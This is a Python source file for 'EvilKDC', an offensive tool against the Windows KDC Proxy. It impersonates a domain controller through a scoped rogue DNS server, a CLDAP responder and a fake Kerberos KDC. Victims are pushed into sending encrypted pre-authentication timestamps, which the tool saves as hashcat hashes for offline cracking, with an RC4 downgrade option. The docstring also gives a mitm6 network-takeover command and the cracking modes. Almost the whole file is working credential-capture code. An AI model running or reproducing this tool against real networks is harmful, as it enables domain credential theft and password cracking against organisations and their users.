#!/usr/bin/env python3
"""
EvilKDC -- rogue KDC for the Windows KDC Proxy (MS-KKDCP) attack surface

AUTHORIZED TESTING ONLY. See README.md for the full attack chain, prerequisites, and blast-radius
notes. This tool is the *capture* half of the chain; it does NOT perform the L2 network takeover --
that is a deliberate, separately-run, SCOPED step (mitm6), by design, so the dangerous part stays in
the operator's hands with proper filtering rather than baked into a one-click footgun.

What this single terminal provides:
  * a scoped authoritative DNS responder (udp/53) that answers the DC-locator queries for ONE target
    realm -- the _msdcs SRV records and the DC-host A record -- pointing them at this host. It refuses
    everything outside the target realm, so it does not disrupt unrelated name resolution.
  * a NetLogon CLDAP responder (udp/389) that satisfies the KDC Proxy's DsGetDcName validation.
  * a KDC capture listener (tcp/88) that elicits PA-ENC-TIMESTAMP pre-auth and writes hashcat lines.

How victim traffic reaches it (the prerequisite -- NOT done by this tool):
  the KDC Proxy's host must resolve the target realm's DC via this box. That requires resolver-position
  over the proxy (a DHCP/DHCPv6-assigned DNS you control, a compromised resolver, admin on the proxy,
  or an L2 takeover with mitm6). The floor is UNAUTHENTICATED + network-adjacent -- no AD rights.
  For the L2 case run mitm6 in a SEPARATE terminal, SCOPED to the target so you don't nuke the segment:
      sudo mitm6 -d <realm> -hw <proxy-fqdn> -i <iface>
  then point mitm6's victims at this host as DNS (see README) or use a resolver you control.

Captured PA-ENC-TIMESTAMP cracks OFFLINE, no lockout (the real KDC never sees a guess):
  hashcat -m 7500 (RC4) | -m 19800 (AES128) | -m 19900 (AES256)

Ships with kkcldap.py (imported for the CLDAP responder helpers).
"""
import argparse, socket, struct, sys, threading, datetime, os, time

try:
    from pyasn1.codec.der.encoder import encode as der_encode
    from pyasn1.codec.der.decoder import decode as der_decode
    from impacket.krb5.asn1 import (AS_REQ, KRB_ERROR, METHOD_DATA, ETYPE_INFO2, ETYPE_INFO2_ENTRY,
                                    PA_DATA, EncryptedData, seq_set)
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5 import constants
except Exception as e:
    sys.exit('[!] needs impacket + pyasn1: %s' % e)

try:
    import kkcldap
except Exception as e:
    sys.exit('[!] EvilKDC needs kkcldap.py in the same directory: %s' % e)

HCMODE = {23: 7500, 17: 19800, 18: 19900}
ETNAME = {23: 'RC4', 17: 'AES128', 18: 'AES256'}
PA_ENC_TIMESTAMP = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
PA_ETYPE_INFO2 = int(constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value)

_lock = threading.Lock()
_seen = 0
CLDAP_SEEN = threading.Event()
KDC_SEEN = threading.Event()
DNS_SEEN = threading.Event()


def _now():
    return datetime.datetime.now(datetime.timezone.utc)


def _enc_name(name_b):
    out = b''
    for label in name_b.split(b'.'):
        if label:
            out += bytes([len(label)]) + label
    return out + b'\x00'


def _dns_parse_q(data):
    tid = struct.unpack('>H', data[:2])[0]
    i = 12
    labels = []
    while True:
        l = data[i]; i += 1
        if l == 0:
            break
        if l & 0xC0 == 0xC0:
            i += 1; break
        labels.append(data[i:i + l]); i += l
    qname = b'.'.join(labels)
    qtype, qclass = struct.unpack('>HH', data[i:i + 4]); i += 4
    return tid, qname, qtype, data[12:i]


def dns_build_response(data, domain, host, ip):
    """Answer DC-locator SRV + host A for the target realm only; refuse everything else."""
    tid, qname, qtype, rawq = _dns_parse_q(data)
    ql = qname.lower()
    dom = domain.encode().lower()
    host_b = host.encode().lower()
    in_domain = ql == dom or ql.endswith(b'.' + dom)
    NAME_PTR = b'\xc0\x0c'
    TTL = struct.pack('>I', 600)

    if not in_domain:
        return struct.pack('>HHHHHH', tid, 0x8405, 1, 0, 0, 0) + rawq   # REFUSED (out of scope)

    if qtype == 33:                                     # SRV
        if b'_kerberos._tcp' in ql:      port = 88
        elif b'_ldap._tcp' in ql:        port = 389
        elif b'_kpasswd._' in ql:        port = 464
        elif b'_gc._tcp' in ql:          port = 3268
        else:                            port = 88
        rdata = struct.pack('>HHH', 0, 100, port) + _enc_name(host_b)
        ans = NAME_PTR + struct.pack('>HH', 33, 1) + TTL + struct.pack('>H', len(rdata)) + rdata
        glue = _enc_name(host_b) + struct.pack('>HH', 1, 1) + TTL + struct.pack('>H', 4) + socket.inet_aton(ip)
        return struct.pack('>HHHHHH', tid, 0x8400, 1, 1, 0, 1) + rawq + ans + glue

    if qtype == 1:                                      # A
        if ql == host_b:
            rdata = socket.inet_aton(ip)
            ans = NAME_PTR + struct.pack('>HH', 1, 1) + TTL + struct.pack('>H', 4) + rdata
            return struct.pack('>HHHHHH', tid, 0x8400, 1, 1, 0, 0) + rawq + ans
        return struct.pack('>HHHHHH', tid, 0x8403, 1, 0, 0, 0) + rawq   # NXDOMAIN

    if qtype == 28:                                     # AAAA -> NODATA, client falls to A
        return struct.pack('>HHHHHH', tid, 0x8400, 1, 0, 0, 0) + rawq

    return struct.pack('>HHHHHH', tid, 0x8400, 1, 0, 0, 0) + rawq


def dns_server(bind, domain, host, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind, 53))
    while True:
        data, addr = s.recvfrom(2048)
        try:
            _, qname, qtype, _ = _dns_parse_q(data)
            s.sendto(dns_build_response(data, domain, host, ip), addr)
            if qname.lower().endswith(domain.encode().lower()):
                DNS_SEEN.set()
                t = {1: 'A', 28: 'AAAA', 33: 'SRV'}.get(qtype, str(qtype))
                print('[dns] %-15s %-4s %s' % (addr[0], t, qname.decode('latin1')))
        except Exception:
            pass


def recv_framed(conn):
    hdr = b''
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            return None
        hdr += c
    n = struct.unpack('>I', hdr)[0]
    if n == 0 or n > 5_000_000:
        return None
    buf = b''
    while len(buf) < n:
        c = conn.recv(n - len(buf))
        if not c:
            break
        buf += c
    return buf


def framed(msg):
    return struct.pack('>I', len(msg)) + msg


def parse_asreq(data):
    asreq = der_decode(data, asn1Spec=AS_REQ())[0]
    body = asreq['req-body']
    user = '/'.join(str(x) for x in body['cname']['name-string'])
    realm = str(body['realm'])
    enc_ts = None
    if asreq['padata'].hasValue():
        for entry in asreq['padata']:
            if int(entry['padata-type']) == PA_ENC_TIMESTAMP:
                ed = der_decode(bytes(entry['padata-value']), asn1Spec=EncryptedData())[0]
                enc_ts = (int(ed['etype']), bytes(ed['cipher']))
    return user, realm, enc_ts


def krb5pa_line(user, realm, etype, cipher, salt):
    h = cipher.hex()
    if etype == 23:
        return HCMODE[23], '$krb5pa$23$%s$%s$%s$%s' % (user, realm, salt, h)
    if etype in (17, 18):
        return HCMODE[etype], '$krb5pa$%d$%s$%s$%s' % (etype, user, realm, h)
    return None, '$krb5pa$%d$%s$%s$%s' % (etype, user, realm, h)


def build_preauth_required(realm, user, offer_etypes):
    salt = realm.upper() + user
    ei = ETYPE_INFO2()
    for i, et in enumerate(offer_etypes):
        e = ETYPE_INFO2_ENTRY(); e['etype'] = et
        if et != 23:
            e['salt'] = salt
        ei.setComponentByPosition(i, e)
    md = METHOD_DATA()
    p0 = PA_DATA(); p0['padata-type'] = PA_ETYPE_INFO2; p0['padata-value'] = der_encode(ei)
    p1 = PA_DATA(); p1['padata-type'] = PA_ENC_TIMESTAMP; p1['padata-value'] = b''
    md.setComponentByPosition(0, p0); md.setComponentByPosition(1, p1)
    err = KRB_ERROR()
    err['pvno'] = 5; err['msg-type'] = int(constants.ApplicationTagNumbers.KRB_ERROR.value)
    now = _now(); err['stime'] = KerberosTime.to_asn1(now); err['susec'] = now.microsecond
    err['error-code'] = int(constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value)
    err['realm'] = realm.upper()
    seq_set(err, 'sname', Principal('krbtgt/' + realm.upper(),
            type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    err['e-data'] = der_encode(md)
    return der_encode(err)


def build_terminal_error(realm):
    err = KRB_ERROR()
    err['pvno'] = 5; err['msg-type'] = int(constants.ApplicationTagNumbers.KRB_ERROR.value)
    now = _now(); err['stime'] = KerberosTime.to_asn1(now); err['susec'] = now.microsecond
    err['error-code'] = int(constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value)
    err['realm'] = realm.upper()
    seq_set(err, 'sname', Principal('krbtgt/' + realm.upper(),
            type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    return der_encode(err)


def handle_kdc(conn, addr, a, lootpath):
    global _seen
    KDC_SEEN.set()
    try:
        data = recv_framed(conn)
        if not data:
            return
        try:
            user, realm, enc_ts = parse_asreq(data)
        except Exception as e:
            print('[!] %s non-AS-REQ / unparseable (%s)' % (addr[0], type(e).__name__)); return
        if enc_ts is None:
            offer = [23] if a.downgrade else [18, 17, 23]
            conn.sendall(framed(build_preauth_required(realm, user, offer)))
            tag = ' (RC4-only downgrade)' if a.downgrade else ''
            print('[*] %-15s AS-REQ %s@%s (no pre-auth) -> PREAUTH_REQUIRED%s' % (addr[0], user, realm, tag))
            return
        etype, cipher = enc_ts
        mode, line = krb5pa_line(user, realm, etype, cipher, realm.upper() + user)
        with _lock:
            _seen += 1
            with open(lootpath, 'a') as f:
                f.write(line + '\n')
        print('\n[+] CAPTURED  %s@%s  etype=%s(%d)  hashcat -m %s' % (user, realm, ETNAME.get(etype, '?'), etype, mode))
        print('    ' + line)
        print('    (offline-crackable, no lockout; -> %s)\n' % lootpath)
        conn.sendall(framed(build_terminal_error(realm)))
    except Exception as e:
        print('    (kdc handler: %s)' % e)
    finally:
        try: conn.close()
        except Exception: pass


def kdc_server(bind, a, lootpath):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((bind, 88)); srv.listen(32)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_kdc, args=(conn, addr, a, lootpath), daemon=True).start()


def cldap_server(bind, a):
    host = a.host; forest = a.forest or a.domain
    nbdomain = a.nbdomain or a.domain.split('.')[0].upper()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind, 389))
    while True:
        data, addr = s.recvfrom(4096)
        try:
            msgid, ntver = kkcldap.parse_msgid_and_ntver(data)
            asked = kkcldap.req_domain(data)
            dom = asked or a.domain
            blob = kkcldap.netlogon_ex(dom, forest, host, nbdomain, a.nbcomputer, a.site, ntver or 5)
            s.sendto(kkcldap.build_response(msgid, blob), addr)
            CLDAP_SEEN.set()
            print('[*] %-15s CLDAP ping (DnsDomain=%r) -> answered as DC for %s' % (addr[0], asked, dom))
        except Exception as e:
            print('    (cldap: %s)' % e)


def _der_len(n):
    if n < 0x80:
        return bytes([n])
    b = b''
    while n:
        b = bytes([n & 0xff]) + b; n >>= 8
    return bytes([0x80 | len(b)]) + b


def _tlv(tag, data):
    return bytes([tag]) + _der_len(len(data)) + data


def _kkdcp_wrap(kerb, domain):
    """KDC-PROXY-MESSAGE: SEQUENCE { [0] OCTET STRING (4-byte-len + kerb msg), [1] GeneralString realm }."""
    inner = struct.pack('>I', len(kerb)) + kerb
    f0 = _tlv(0xA0, _tlv(0x04, inner))
    f1 = _tlv(0xA1, _tlv(0x1B, domain.encode()))
    return _tlv(0x30, f0 + f1)


def _build_bare_asreq(realm, user='evilkdc-check'):
    """Minimal no-pre-auth AS-REQ, used only by --check to probe whether the proxy resolves us."""
    from impacket.krb5.asn1 import AS_REQ, seq_set as _ss, seq_set_iter as _ssi
    import datetime as _dt, random as _rnd
    a = AS_REQ(); a['pvno'] = 5; a['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    b = _ss(a, 'req-body')
    b['kdc-options'] = constants.encodeFlags([])
    _ss(b, 'cname', Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
    b['realm'] = realm.upper()
    _ss(b, 'sname', Principal('krbtgt/' + realm.upper(), type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    b['till'] = KerberosTime.to_asn1(_dt.datetime(2037, 1, 1, tzinfo=_dt.timezone.utc))
    b['nonce'] = _rnd.getrandbits(31)
    _ssi(b, 'etype', (18, 17, 23))
    return der_encode(a)


def _bindable(kind, port, bind):
    fam = socket.SOCK_DGRAM if kind == 'udp' else socket.SOCK_STREAM
    s = socket.socket(socket.AF_INET, fam)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((bind, port)); s.close(); return True, ''
    except Exception as e:
        s.close(); return False, str(e)


def _dns_selftest(domain, host, ip):
    q = struct.pack('>HHHHHH', 0x1337, 0x0100, 1, 0, 0, 0) + \
        _enc_name(('_kerberos._tcp.dc._msdcs.' + domain).encode()) + struct.pack('>HH', 33, 1)
    resp = dns_build_response(q, domain, host, ip)
    # DNS names are wire-encoded (length-prefixed labels), not dotted strings:
    ok_srv = _enc_name(host.encode()) in resp and socket.inet_aton(ip) in resp
    qa = struct.pack('>HHHHHH', 0x1338, 0x0100, 1, 0, 0, 0) + \
        _enc_name(host.encode()) + struct.pack('>HH', 1, 1)
    ok_a = socket.inet_aton(ip) in dns_build_response(qa, domain, host, ip)
    return ok_srv, ok_a


def do_check(a):
    print('=' * 68)
    print(' EvilKDC preflight --check   realm=%s  advertise=%s  ip=%s' % (a.domain, a.host, a.bind))
    print('=' * 68)
    allok = True
    for kind, port, label in (('udp', 53, 'DNS'), ('udp', 389, 'CLDAP'), ('tcp', 88, 'KDC')):
        ok, err = _bindable(kind, port, a.bind)
        print(' [%s] bind %s/%d (%s)%s' % ('OK ' if ok else 'FAIL', kind, port, label,
              '' if ok else '  <- ' + err.split(']')[-1].strip()))
        allok = allok and ok
    if not allok:
        print('\n [!] a listener cannot bind -- need root, and stop any dnsmasq/mitm6 holding 53/389/88.')
        return
    ok_srv, ok_a = _dns_selftest(a.domain, a.host, a.bind)
    print(' [%s] DNS self-test: SRV _kerberos._tcp.dc._msdcs.%s -> %s' % ('OK ' if ok_srv else 'FAIL', a.domain, a.host))
    print(' [%s] DNS self-test: A %s -> %s' % ('OK ' if ok_a else 'FAIL', a.host, a.bind))

    if a.proxy:
        print('\n [*] end-to-end: firing a probe through %s for realm %s ...' % (a.proxy, a.domain))
        have_req = False
        try:
            import requests, urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            have_req = True
        except Exception as e:
            print('     [WARN] cannot run e2e probe (need requests): %s' % e)
        if have_req:
            CLDAP_SEEN.clear(); KDC_SEEN.clear()
            threading.Thread(target=cldap_server, args=(a.bind, a), daemon=True).start()
            threading.Thread(target=kdc_server, args=(a.bind, a, os.devnull), daemon=True).start()
            time.sleep(0.4)
            try:
                body = _kkdcp_wrap(_build_bare_asreq(a.domain), a.domain)
                requests.post(a.proxy, data=body, headers={'Content-Type': 'application/kerberos'},
                              verify=False, timeout=8)
            except Exception:
                pass
            hit = CLDAP_SEEN.wait(8) or KDC_SEEN.is_set()
            if hit:
                print('     [OK ] REDIRECT LIVE -- the proxy located THIS host as the DC for %s.' % a.domain)
                print('           You are in the resolution path. Run without --check to capture.')
            else:
                print('     [MISS] proxy did not reach this host -- it is NOT resolving %s to you yet.' % a.domain)
                print('            Establish resolver position first (scoped mitm6 / DHCP DNS / resolver). See README.')
    else:
        print('\n [i] add --proxy https://<proxy>/KdcProxy for an end-to-end "is the redirect live" check.')
    print('\n [i] Prereq: the KDC Proxy host must resolve %s\'s DC via THIS box (%s).' % (a.domain, a.bind))
    print('     This tool does not take that position for you -- that is the deliberate, scoped mitm6 step.')


def main():
    ap = argparse.ArgumentParser(
        description='EvilKDC -- rogue KDC + scoped DNS + pre-auth capture for the MS-KKDCP attack surface (authorized use only)',
        epilog='Two-terminal workflow: (1) scoped mitm6 for L2 resolver-position, (2) this tool. See README.md.')
    ap.add_argument('--domain', required=True, help='target realm to impersonate the DC for (e.g. corp.local)')
    ap.add_argument('--host', help='DC dns host to advertise (default dc.<domain>); must match what DNS resolves to us')
    ap.add_argument('--bind', default='0.0.0.0', help='bind/advertise IP (use your in-path IP if multi-homed)')
    ap.add_argument('--forest', help='forest name (default <domain>)')
    ap.add_argument('--nbdomain', help='netbios domain (default leftmost label upper)')
    ap.add_argument('--nbcomputer', default='DC')
    ap.add_argument('--site', default='Default-First-Site-Name')
    ap.add_argument('--downgrade', action='store_true', help='offer RC4 only in the pre-auth hint (hashcat 7500)')
    ap.add_argument('--no-dns', action='store_true', help='do NOT run the built-in DNS server (use an external resolver)')
    ap.add_argument('--loot', default='evilkdc_loot.txt', help='append captured $krb5pa$ lines here')
    ap.add_argument('--check', action='store_true', help='preflight: verify listeners + DNS, and (with --proxy) if the redirect is live')
    ap.add_argument('--proxy', help='KDC Proxy URL, used only by --check for the end-to-end test')
    a = ap.parse_args()
    if not a.host:
        a.host = 'dc.' + a.domain

    if a.check:
        do_check(a); return

    lootpath = os.path.abspath(a.loot)
    print('=' * 72)
    print(' EvilKDC -- rogue KDC + scoped DNS + pre-auth capture (AUTHORIZED USE ONLY)')
    print('=' * 72)
    print(' realm       : %s' % a.domain)
    print(' advertise   : %s  (bind/ip %s)' % (a.host, a.bind))
    print(' etype hint  : %s' % ('RC4 only [--downgrade]' if a.downgrade else 'AES256,AES128,RC4'))
    print(' listeners   : %sudp/389 (CLDAP)  tcp/88 (KDC capture)' % ('udp/53 (scoped DNS)  ' if not a.no_dns else ''))
    print(' loot        : %s' % lootpath)
    print(' crack       : hashcat -m 7500 (RC4) | -m 19800 (AES128) | -m 19900 (AES256)')
    print(' prereq      : the KDC Proxy must resolve %s\'s DC to THIS host (mitm6/DHCP/resolver -- README)' % a.domain)
    print('-' * 72)
    if not a.no_dns:
        print(' [i] scoped DNS answers DC-locator SRV+A for %s ONLY; refuses all other names.' % a.domain)
    print(' waiting for relayed AS-REQs ... Ctrl-C to stop\n')

    if not a.no_dns:
        threading.Thread(target=dns_server, args=(a.bind, a.domain, a.host, a.bind), daemon=True).start()
    threading.Thread(target=cldap_server, args=(a.bind, a), daemon=True).start()
    try:
        kdc_server(a.bind, a, lootpath)
    except KeyboardInterrupt:
        print('\n[*] stopped. %d credential(s) captured -> %s' % (_seen, lootpath))
    except PermissionError:
        sys.exit('[!] binding 53/389/88 needs root (sudo). Try --check first.')


if __name__ == '__main__':
    main()
